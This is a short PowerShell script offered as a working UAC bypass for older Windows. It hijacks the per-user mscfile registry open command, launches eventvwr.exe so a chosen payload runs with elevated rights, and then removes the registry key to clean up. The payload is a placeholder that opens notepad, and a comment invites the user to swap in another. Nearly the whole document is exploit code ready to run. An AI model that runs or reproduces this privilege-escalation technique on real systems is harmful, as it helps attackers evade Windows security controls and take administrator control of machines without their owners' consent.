<#
.SYNOPSIS
    Attempts to bypass UAC using eventvwr.exe and a registry hijack.
.DESCRIPTION
    This technique works on older versions of Windows and exploits the way eventvwr.exe loads mmc.exe.
#>

Write-Host "`n[+] Starting UAC Bypass..." -ForegroundColor Yellow

# Define the payload to execute (change this path)
$payload = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -Command `"Start-Process notepad -Verb runAs`""

# Registry path to hijack
$regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"

# Backup if needed (not implemented)
Write-Host "[*] Setting registry for hijack..."
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(default)" -Value $payload

# Launch eventvwr.exe to trigger escalation
Write-Host "[*] Launching eventvwr.exe..."
Start-Process "eventvwr.exe"

Start-Sleep -Seconds 5

# Clean up
Write-Host "[*] Cleaning registry..."
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force

Write-Host "[+] UAC Bypass attempt complete. Check for elevated process." -ForegroundColor Green
